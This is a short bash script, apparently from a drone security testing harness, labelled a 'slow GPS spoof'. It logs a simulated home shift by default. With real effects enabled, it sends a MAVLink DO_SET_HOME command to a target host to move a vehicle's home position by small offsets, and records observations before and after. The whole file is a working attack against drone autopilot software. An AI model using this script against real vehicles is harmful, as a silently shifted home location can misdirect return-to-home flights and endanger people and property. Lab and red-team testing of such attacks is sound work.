#!/usr/bin/env bash
# Slow GPS spoof: gradual home shift via MAVLink command
set -euo pipefail
BASE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
. "$BASE/00_env.sh"; . "$BASE/sh_core/lpc_bus.sh"; . "$BASE/sh_core/metrics.sh"

: "${DLAT:=0.00005}"
: "${DLON:=0.00005}"
: "${DALT:=2}"
: "${DUR:=1}"

main(){
  log "[gps_slow_spoof] mode=$LPC_MODE dlat=$DLAT dlon=$DLON dalt=$DALT dur=$DUR"
  local before after; before=$(obs_snapshot "$DVD_C_GCS" "$DVD_TARGET_IF")
  if [ "${ALLOW_REAL_EFFECTS:-0}" -eq 1 ]; then
    # MAV_CMD_DO_SET_HOME (179): set specific location
    python3 "$BASE/interface/mavlink_cmd.py" --host "$DVD_MAVLINK_HOST" --port "$DVD_MAVLINK_PORT" \
      cmd-long 179 0 0 0 0 "$DLAT" "$DLON" "$DALT" || true
    bus_emit "gps" "action=home_shift dlat=$DLAT dlon=$DLON dalt=$DALT target=${DVD_MAVLINK_HOST}:${DVD_MAVLINK_PORT}"
  else
    bus_emit "gps" "action=home_shift_sim dlat=$DLAT dlon=$DLON dalt=$DALT"
    effect_emit "delay_ms=3 jitter_ms=1"
  fi
  sleep "$DUR"
  after=$(obs_snapshot "$DVD_C_GCS" "$DVD_TARGET_IF"); delta_emit "$before" "$after" "gps_obs"
}
main "$@"
